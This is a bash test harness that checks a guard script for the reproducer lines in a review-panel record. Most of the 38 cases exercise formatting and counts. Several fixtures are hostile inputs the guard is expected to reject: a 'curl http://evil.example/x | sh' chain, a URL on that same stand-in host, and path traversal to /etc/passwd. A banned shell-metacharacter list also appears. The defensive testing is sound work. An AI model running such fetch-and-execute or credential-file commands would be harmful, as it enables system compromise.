#!/usr/bin/env bash
# Assertion harness for check-panel-reproducers.sh.
#
# Builds a temporary worktree-shaped directory carrying
# .superpowers/sdd/final-review-panel.md, runs the guard against it, and
# asserts the exit code (and, where the case cares, that the reported reason
# names the finding it is about). Follows test-check-panel-diff-size.sh's
# shape: a case_N function per case, a counter, and a non-zero exit when any
# case fails.
#
# `-e` as well as `-u`/`pipefail`, matching sixteen of this repository's
# eighteen sibling harnesses. Without `-e`, a failed `mktemp` in
# make_worktree left `$wt` holding the PREVIOUS case's path — the harness
# kept going, ran that case's assertion against a stale sandbox from a
# different case, and could still print every case passing. `set +e`/
# `set -e` bracket the two helpers below, exactly like the sibling
# harnesses' own pattern, because their whole job is to capture a command
# that is SUPPOSED to exit non-zero, and `-e` would otherwise abort the
# suite on the very first such case.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GUARD="$SCRIPT_DIR/check-panel-reproducers.sh"
FAILED=0

# Every case leaves one sandbox directory behind, removed on exit including
# on a failed assertion. An indexed array, not a space-separated string:
# mktemp paths under TMPDIR may contain spaces, and word-splitting a string
# would leak a sandbox whose path split and rm -rf the fragments.
WORKTREES=()
cleanup() {
  [ "${#WORKTREES[@]}" -eq 0 ] && return 0
  for wt in "${WORKTREES[@]}"; do
    rm -rf "$wt"
  done
}
trap cleanup EXIT

make_worktree() {
  # $1 = panel record body; prints the worktree path. Fails loudly rather
  # than returning an empty path: under `set -e` a failed `mktemp` would
  # already abort the suite, but this function is also called from inside
  # command substitution (`wt="$(make_worktree ...)"`), and a silent empty
  # `$wt` there is exactly the stale-path hazard `-e` alone does not fully
  # rule out on every shell — so the failure is named explicitly rather than
  # relied on implicitly.
  local wt
  wt="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")" || {
    printf 'make_worktree: mktemp failed — aborting suite rather than continuing with a stale path\n' >&2
    exit 1
  }
  WORKTREES+=("$wt")
  mkdir -p "$wt/.superpowers/sdd"
  printf '%s\n' "$1" > "$wt/.superpowers/sdd/final-review-panel.md"
  printf '%s' "$wt"
}

expect_exit() {
  # $1 = label, $2 = expected exit, $3... = command
  local label="$1" want="$2"; shift 2
  local out got
  # The command under test is EXPECTED to exit non-zero in most cases here,
  # so it runs under a local `set +e`/`set -e` bracket — matching this
  # repository's other harnesses — rather than letting the suite's own
  # `set -e` treat that expected non-zero exit as the suite's own failure.
  set +e
  out="$("$@" 2>&1)"; got=$?
  set -e
  if [[ "$got" != "$want" ]]; then
    printf 'FAIL %s: expected exit %s, got %s\n%s\n' "$label" "$want" "$got" "$out"
    FAILED=1
  else
    printf 'ok: %s\n' "$label"
  fi
}

expect_exit_and_names() {
  # $1 = label, $2 = expected exit, $3 = substring the output must contain,
  # $4... = command
  local label="$1" want="$2" needle="$3"; shift 3
  local out got
  set +e
  out="$("$@" 2>&1)"; got=$?
  set -e
  if [[ "$got" != "$want" ]]; then
    printf 'FAIL %s: expected exit %s, got %s\n%s\n' "$label" "$want" "$got" "$out"
    FAILED=1
    return
  fi
  case "$out" in
    *"$needle"*) printf 'ok: %s\n' "$label" ;;
    *)
      printf 'FAIL %s: expected output to name %s, got:\n%s\n' "$label" "$needle" "$out"
      FAILED=1
      ;;
  esac
}

# ===========================================================================
# 1. Every finding has a well-formed reproducer — exit 0.
# ===========================================================================
wt="$(make_worktree 'findings-total: 2
finding-status: F1 fixed
finding-status: F2 fixed

reproducers-total: 2
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
finding-reproducer: F2 none — prose-only, no runnable check')"
expect_exit 'case 1: all present exits 0' 0 "$GUARD" "$wt"

# ===========================================================================
# 2. A finding named in the status block has no reproducer line — exit 1,
#    naming it with the MISSING wording specifically (not merely the
#    identifier substring). F20 found that swapping the guard's two `comm`
#    directions mislabels every finding — a missing reproducer reported with
#    the EXTRA wording and vice versa — while still passing an assertion
#    that only checks the identifier appears somewhere in the output. Tying
#    the identifier to its own message's wording is what a swap would break.
# ===========================================================================
wt="$(make_worktree 'findings-total: 2
finding-status: F1 fixed
finding-status: F2 open

reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit_and_names 'case 2: missing reproducer for F2 exits 1 and names it' 1 'F2 carry no reproducer' "$GUARD" "$wt"

# ===========================================================================
# 3. reproducers-total disagrees with the number of anchored reproducer
#    lines — exit 1.
# ===========================================================================
wt="$(make_worktree 'findings-total: 2
finding-status: F1 fixed
finding-status: F2 fixed

reproducers-total: 5
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
finding-reproducer: F2 none — prose-only, no runnable check')"
expect_exit_and_names 'case 3: reproducers-total mismatch exits 1' 1 'reproducers-total' "$GUARD" "$wt"

# ===========================================================================
# 4. Two finding-reproducer: lines reuse F1 — exit 1, naming the reused
#    identifier.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 2
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
finding-reproducer: F1 none — prose-only, no runnable check')"
expect_exit_and_names 'case 4: reused identifier exits 1 and names F1' 1 'F1' "$GUARD" "$wt"

# ===========================================================================
# 5. A finding-reproducer: line is indented, or carries an identifier with
#    nothing after it — exit 1.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit 'case 5: indented reproducer line exits 1' 1 "$GUARD" "$wt"

wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1')"
expect_exit 'case 5b: identifier with nothing after it exits 1' 1 "$GUARD" "$wt"

# ===========================================================================
# 6. none — <reason> is accepted as well-formed — exit 0.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 none — prose-only, no runnable check')"
expect_exit 'case 6: none — <reason> is well-formed, exits 0' 0 "$GUARD" "$wt"

# ===========================================================================
# 7. A record with findings-total: 0, no status markers, reproducers-total:
#    0 and no reproducer lines — exit 0.
# ===========================================================================
wt="$(make_worktree 'findings-total: 0

reproducers-total: 0')"
expect_exit 'case 7: zero findings exits 0' 0 "$GUARD" "$wt"

# ===========================================================================
# 8. No panel record at the expected path — exit 2.
# ===========================================================================
wt8="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
WORKTREES+=("$wt8")
expect_exit 'case 8: missing record exits 2' 2 "$GUARD" "$wt8"

# ===========================================================================
# 9. The argument is not a directory — exit 2, naming the argument as not a
#    directory. Asserting the message, not just the exit code, is what
#    isolates this case from the missing-record case (8), which also exits
#    2 but for a different reason and with a different message.
# ===========================================================================
not_a_dir="$(mktemp "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
expect_exit_and_names 'case 9: non-directory argument exits 2 and names it' 2 'not a directory' "$GUARD" "$not_a_dir"
rm -f "$not_a_dir"

# ===========================================================================
# 10. A reproducer line names F9, which the status block does not name —
#     exit 1, with the EXTRA wording specifically (not merely the identifier
#     substring). Paired with case 2 above: a `comm` direction swap would
#     make this case's F9 report with the MISSING wording instead, and only
#     an assertion on the message's own text — not the bare identifier —
#     catches that.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 2
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
finding-reproducer: F9 none — prose-only, no runnable check')"
expect_exit_and_names 'case 10: reproducer names unknown F9 exits 1' 1 'F9, which the finding-status block does not name' "$GUARD" "$wt"

# ===========================================================================
# 11. A finding-reproducer: line is indented while every identifier
#     otherwise matches perfectly — exit 1, naming that check's own reason,
#     and no other check fires alongside it. This isolates the R_NAMED vs
#     R_ANCHORED check from the mutant that deletes its `if` block: with
#     that block gone, every other check in this record is satisfied, so the
#     guard would wrongly report REPRODUCERS-OK.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit_and_names 'case 11: indented reproducer line is isolated and exits 1' 1 'line(s) naming finding-reproducer:' "$GUARD" "$wt"

# ===========================================================================
# 12. No reproducers-total: line at all — exit 1. Isolates the
#     "exactly one reproducers-total: line" check from the mutant that
#     forces its `if` to false, which leaves all other cases here green.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit_and_names 'case 12: missing reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"

# ===========================================================================
# 13. Two reproducers-total: lines — exit 1, same check as case 12.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit_and_names 'case 13: duplicated reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"

# ===========================================================================
# 14. The record path is a directory, not a file — exit 2. `-r` alone is
#     true of a directory, which previously fell through to REPRODUCERS-OK.
# ===========================================================================
wt14="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
WORKTREES+=("$wt14")
mkdir -p "$wt14/.superpowers/sdd/final-review-panel.md"
expect_exit_and_names 'case 14: directory-shaped record path exits 2' 2 'no readable panel record' "$GUARD" "$wt14"

# ===========================================================================
# 15. A finding-reproducer: line reads a bare `none` with no reason — exit
#     1, naming the defect. The structural pattern that drives R_ANCHORED
#     accepts this line as well-formed on its own; this case isolates the
#     separate none-with-no-reason check from that pattern.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 none')"
expect_exit_and_names 'case 15: bare none with no reason exits 1' 1 "declare 'none' with no reason" "$GUARD" "$wt"

# ===========================================================================
# 16. The worktree argument is a RELATIVE path beginning with `-`
#     (`-dashy`), and the record inside it carries a real, detectable
#     violation (F2 has no reproducer). Before containment this made every
#     grep parse the record path as options and the guard reported
#     REPRODUCERS-OK at exit 0 regardless of the record's actual contents;
#     asserting the real violation is still caught — not merely that the
#     exit code changed — is what proves grep is reading the record rather
#     than being fooled by the leading `-`.
# ===========================================================================
base16="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
WORKTREES+=("$base16")
mkdir -p "$base16/-dashy/.superpowers/sdd"
printf '%s\n' 'findings-total: 2
finding-status: F1 fixed
finding-status: F2 open

reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh' > "$base16/-dashy/.superpowers/sdd/final-review-panel.md"
set +e
out16="$(cd "$base16" && "$GUARD" "-dashy" 2>&1)"; got16=$?
set -e
if [[ "$got16" == 1 ]] && [[ "$out16" == *'F2'* ]]; then
  printf 'ok: %s\n' 'case 16: dash-prefixed relative worktree still detects a real violation'
else
  printf 'FAIL %s: expected exit 1 naming F2, got exit %s\n%s\n' 'case 16: dash-prefixed relative worktree still detects a real violation' "$got16" "$out16"
  FAILED=1
fi

# ===========================================================================
# 17. reproducers-total carries an absurdly long digit string (26 digits) —
#     exit 1, rejected as malformed rather than dying inside an integer
#     comparison and silently reporting REPRODUCERS-OK.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 99999999999999999999999999
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit_and_names 'case 17: absurdly long reproducers-total is rejected, not silently passed' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"

# ===========================================================================
# 18. Prose sits between the two finding-reproducer: marker lines — exit 1,
#     the unbroken-span check firing. Locks in behaviour that was already
#     correct but had no case pinning it for this specific shape (markers
#     separated by intervening prose, as opposed to case 11's indented-line
#     shape).
# ===========================================================================
wt="$(make_worktree 'findings-total: 2
finding-status: F1 fixed
finding-status: F2 fixed

reproducers-total: 2
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
some prose sitting between the two markers
finding-reproducer: F2 none — prose-only, no runnable check')"
expect_exit_and_names 'case 18: prose between markers breaks the unbroken span' 1 'unbroken block' "$GUARD" "$wt"

# ===========================================================================
# 19. The finding-status: block and the finding-reproducer: block name the
#     same findings in reversed order (F2 then F1, versus F1 then F2) — the
#     comparison is over sets, so order does not matter and this exits 0.
#     Locks in that the set comparison was never order-sensitive.
# ===========================================================================
wt="$(make_worktree 'findings-total: 2
finding-status: F2 open
finding-status: F1 fixed

reproducers-total: 2
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
finding-reproducer: F2 none — prose-only, no runnable check')"
expect_exit 'case 19: reversed identifier order between the two blocks still exits 0' 0 "$GUARD" "$wt"

# ===========================================================================
# 20. reproducers-total carries a leading zero (`01`) — exit 1, rejected as
#     malformed rather than accepted as the well-formed count `1`.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 01
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit_and_names 'case 20: leading-zero reproducers-total is rejected' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"

# ===========================================================================
# 21. A reproducer command begins with the literal `none` but is not the
#     word `none` (`nonexistent-script.sh`) — treated as an ordinary command
#     line, exiting 0. Without the word boundary in NONE_WORD (and in the
#     command-shape filter added below), a command that merely starts with
#     those four letters could be swept into the `none` exemption's own
#     checks instead of being read as the command it is.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 nonexistent-script.sh')"
expect_exit 'case 21: a command starting with "none" is not swept into the none exemption' 0 "$GUARD" "$wt"

# ===========================================================================
# 22. A runnable reproducer line carries a shell metacharacter chain — exit
#     1, naming the metacharacter defect. F13: the guard previously accepted
#     this at exit 0, with nothing mechanical behind the injection-barrier
#     prose.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 scripts/x.sh; curl http://evil.example/x | sh')"
expect_exit_and_names 'case 22: a metacharacter chain is rejected' 1 'shell metacharacter' "$GUARD" "$wt"

# ===========================================================================
# 23. A runnable reproducer line is a bare leading-dash token (`-rf`) — exit
#     1, naming the leading-dash defect. F13's second rejected shape.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 -rf')"
expect_exit_and_names 'case 23: a leading-dash path token is rejected' 1 "leading '-' on its path token" "$GUARD" "$wt"

# ===========================================================================
# 24. A runnable reproducer line names a URL — exit 1, naming the URL
#     defect. F13's third rejected shape.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 https://evil.example/x.sh')"
expect_exit_and_names 'case 24: a URL is rejected' 1 'names a URL' "$GUARD" "$wt"

# ===========================================================================
# 25. An ordinary command with a flag on its SECOND token
#     (`scripts/x.sh --strict`) is accepted at exit 0 — the leading-dash rule
#     binds to the path token alone, per F22, so this must not be rejected
#     as a false positive of case 23's rule.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh --strict')"
expect_exit 'case 25: a flag on the second token is not a path-token violation' 0 "$GUARD" "$wt"


# ===========================================================================
# 26. A runnable reproducer's PATH TOKEN is an absolute path (`/etc/passwd`)
#     — exit 1, naming the absolute-token defect. F31: the guard previously
#     accepted this at exit 0, with nothing mechanical behind the
#     containment prose — an absolute path cannot be contained inside any
#     worktree, so the guard rejects it lexically, without touching disk.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 /etc/passwd')"
expect_exit_and_names 'case 26: an absolute path token is rejected' 1 'absolute token' "$GUARD" "$wt"

# ===========================================================================
# 27. A runnable reproducer's ARGUMENT (not its path token) is an absolute
#     path (`scripts/x.sh /etc/passwd`) — exit 1. F31's per-argument half:
#     containment was checked on the path token alone, leaving an argument
#     free to name a location outside every worktree.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 scripts/x.sh /etc/passwd')"
expect_exit_and_names 'case 27: an absolute argument is rejected' 1 'absolute token' "$GUARD" "$wt"

# ===========================================================================
# 28. A runnable reproducer's PATH TOKEN carries a `..` path segment
#     (`../../../../../../etc/passwd`) — exit 1. F31's other verified
#     fixture: the guard previously accepted this at exit 0.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 ../../../../../../etc/passwd')"
expect_exit_and_names 'case 28: a `..`-traversal path token is rejected' 1 "'..' path segment" "$GUARD" "$wt"

# ===========================================================================
# 29. A runnable reproducer's ARGUMENT carries a `..` path segment
#     (`scripts/x.sh ../../../etc/passwd`) — exit 1. F31's per-argument half
#     of the traversal check.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 scripts/x.sh ../../../etc/passwd')"
expect_exit_and_names 'case 29: a `..`-traversal argument is rejected' 1 "'..' path segment" "$GUARD" "$wt"

# ===========================================================================
# 30. A positive control for cases 28-29: a path token containing the two
#     characters `..` WITHOUT that being a whole path segment
#     (`scripts/foo..bar.sh`) is accepted at exit 0. Proves the `..` check is
#     bound to a path segment, not to the substring, so an ordinary filename
#     that happens to contain two dots is not swept in as a false positive.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 scripts/foo..bar.sh')"
expect_exit 'case 30: two dots inside a filename, not a path segment, is not rejected' 0 "$GUARD" "$wt"

# ===========================================================================
# 31. A NUL byte sits inside a finding-reproducer: line — exit 1, naming the
#     NUL-byte defect. F32: bash silently drops the byte from any variable
#     it is read into, so this must be constructed directly on disk (like
#     case 14/16 above) rather than through make_worktree's own "$1"
#     argument, which cannot carry a NUL through bash at all.
# ===========================================================================
wt31="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
WORKTREES+=("$wt31")
mkdir -p "$wt31/.superpowers/sdd"
printf 'findings-total: 1\nfinding-status: F1 open\n\nreproducers-total: 1\nfinding-reproducer: F1 scripts/y\0.sh\n' > "$wt31/.superpowers/sdd/final-review-panel.md"
expect_exit_and_names 'case 31: a NUL byte in the record is rejected' 1 'NUL byte' "$GUARD" "$wt31"

# ===========================================================================
# 32. A runnable reproducer line ends in a trailing backslash
#     (`scripts/x.sh\`) — exit 1, naming the shell-metacharacter defect. F33:
#     a trailing backslash is a shell line-continuation, which would put a
#     following line outside every check here if it were not banned.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 scripts/x.sh\')"
expect_exit_and_names 'case 32: a trailing backslash is rejected' 1 'shell metacharacter' "$GUARD" "$wt"

# ===========================================================================
# 33. A malformed `reproducers-total: 01` line sits BESIDE a well-formed
#     `reproducers-total: 1` line — exit 1. F39: T_WELLFORMED alone was
#     satisfied by the well-formed line (exactly 1), so the malformed
#     duplicate passed unreported; this pins the gap between case 13 (two
#     well-formed duplicates) and case 20 (one malformed, alone).
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 01
reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit_and_names 'case 33: a malformed reproducers-total beside a well-formed one is rejected' 1 'not well-formed' "$GUARD" "$wt"

# ===========================================================================
# 34. Every banned shell metacharacter, INDIVIDUALLY, triggers rejection — a
#     loop rather than one near-identical case per character, so that adding
#     or removing a character from the banned set only requires touching the
#     shared list here and in the guard. F35: shrinking the guard's list to
#     `|;&` left all 25 cases above still passing, because only `;` and `|`
#     (both inside case 22's chain) were ever exercised alone; every other
#     banned character had no case naming it individually. Case 35 below is
#     the positive control this loop needs: without it, a guard broken to
#     reject every reproducer regardless of content would make this loop
#     pass just as vacuously as the shrunk list once did.
# ===========================================================================
banned_metachars='|;&$`<>(){}~*?[]#\'\''"'
mc_i=0
while [ "$mc_i" -lt "${#banned_metachars}" ]; do
  mc_c="${banned_metachars:$mc_i:1}"
  wt="$(make_worktree "findings-total: 1
finding-status: F1 open

reproducers-total: 1
finding-reproducer: F1 scripts/x${mc_c}sh")"
  expect_exit_and_names "case 34.$mc_i: banned metacharacter '$mc_c' alone is rejected" 1 'shell metacharacter' "$GUARD" "$wt"
  mc_i=$((mc_i + 1))
done

# ===========================================================================
# 35. Positive control for case 34's loop: an ordinary command carrying NONE
#     of the banned metacharacters is accepted at exit 0. Without this, case
#     34 alone could not tell "the guard checks for metacharacters" from
#     "the guard rejects every reproducer regardless of content."
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
expect_exit "case 35: an ordinary command with no banned metacharacter is accepted" 0 "$GUARD" "$wt"

# ===========================================================================
# 36. check-panel-reproducers.sh and run-reproducer.sh agree on the
#     banned-character set, per finding F48 — this exact literal drifted
#     between the two scripts twice already (the backslash for F33, both
#     quote characters for F45, each time landing in one file before the
#     other). Asserted two ways: both scripts read the set from
#     scripts/reproducer-metachars.sh rather than each carrying its own
#     literal (so neither can drift on its own again), and that shared
#     file's value is exactly the expected set (so the shared copy itself
#     has not silently lost or gained a character).
# ===========================================================================
METACHARS_FILE="$SCRIPT_DIR/reproducer-metachars.sh"
EXPECTED_METACHARS='|;&$`<>(){}~*?[]#\'\''"'
if [ -f "$METACHARS_FILE" ] \
  && grep -qF 'source "$SCRIPT_DIR/reproducer-metachars.sh"' "$GUARD" \
  && grep -qF 'source "$SCRIPT_DIR/reproducer-metachars.sh"' "$SCRIPT_DIR/run-reproducer.sh" \
  && ! grep -qE "^\s*metachars='" "$GUARD" \
  && ! grep -qE "^\s*metachars='" "$SCRIPT_DIR/run-reproducer.sh"; then
  # shellcheck disable=SC1090
  ACTUAL_METACHARS="$(bash -c 'source "'"$METACHARS_FILE"'" && printf %s "$REPRODUCER_METACHARS"')"
  if [ "$ACTUAL_METACHARS" = "$EXPECTED_METACHARS" ]; then
    printf 'ok: %s\n' 'case 36: check-panel-reproducers.sh and run-reproducer.sh agree on the banned-character set'
  else
    printf 'FAIL %s: scripts/reproducer-metachars.sh carries an unexpected set: %s\n' 'case 36' "$ACTUAL_METACHARS"
    FAILED=1
  fi
else
  printf 'FAIL %s: check-panel-reproducers.sh and run-reproducer.sh no longer both source the single shared metachar file\n' 'case 36'
  FAILED=1
fi


# ===========================================================================
# 37. A missing scripts/reproducer-metachars.sh is reported as "cannot
#     answer" (exit 2), not "violations found" (exit 1) — finding F56. The
#     guard's own `source` of that file, with no readability check ahead of
#     it, let `set -e` abort the script at exit 1 on a missing dependency:
#     the same code this guard's own contract uses for a real violation, so
#     a caller reading a non-zero exit as "the panel record has a problem"
#     was told the wrong story. Exercised against a REAL copy of the guard,
#     sitting in its own sandbox directory with a well-formed panel record
#     but deliberately no reproducer-metachars.sh beside it, rather than
#     editing the real scripts/ directory this suite runs from.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
MISSING_DEP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test-missing-dep.XXXXXX")"
WORKTREES+=("$MISSING_DEP_DIR")
cp "$GUARD" "$MISSING_DEP_DIR/check-panel-reproducers.sh"
expect_exit_and_names 'case 37: a missing reproducer-metachars.sh is cannot-answer, not violations-found' 2 'cannot read' \
  "$MISSING_DEP_DIR/check-panel-reproducers.sh" "$wt"

# ===========================================================================
# 38. A missing scripts/lib/panel-record.sh is likewise cannot-answer (exit
#     2), not violations-found (exit 1) — the spec's "A missing library is a
#     refusal" scenario (F4). Same shape as case 37, and deliberately kept
#     separate from it rather than folded together: the two are different
#     sourced dependencies, checked by two different `[ ! -r ... ]` guards in
#     check-panel-reproducers.sh, and a regression in either one must fail on
#     its own rather than needing the other's fixture to also be right.
#     Exercised against a REAL copy of the guard, sitting in its own sandbox
#     directory with a well-formed panel record and reproducer-metachars.sh
#     present, but deliberately no lib/panel-record.sh beside it — never the
#     real scripts/lib/panel-record.sh, which this case does not touch.
# ===========================================================================
wt="$(make_worktree 'findings-total: 1
finding-status: F1 fixed

reproducers-total: 1
finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
MISSING_LIB_DIR="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test-missing-lib.XXXXXX")"
WORKTREES+=("$MISSING_LIB_DIR")
cp "$GUARD" "$MISSING_LIB_DIR/check-panel-reproducers.sh"
cp "$SCRIPT_DIR/reproducer-metachars.sh" "$MISSING_LIB_DIR/reproducer-metachars.sh"
expect_exit_and_names 'case 38: a missing lib/panel-record.sh is cannot-answer, not violations-found' 2 'cannot read' \
  "$MISSING_LIB_DIR/check-panel-reproducers.sh" "$wt"

if [ "$FAILED" -ne 0 ]; then
  printf 'check-panel-reproducers-test: one or more cases failed\n' >&2
  exit 1
fi
printf 'check-panel-reproducers-test: all 38 cases plus the metacharacter loop pass\n'
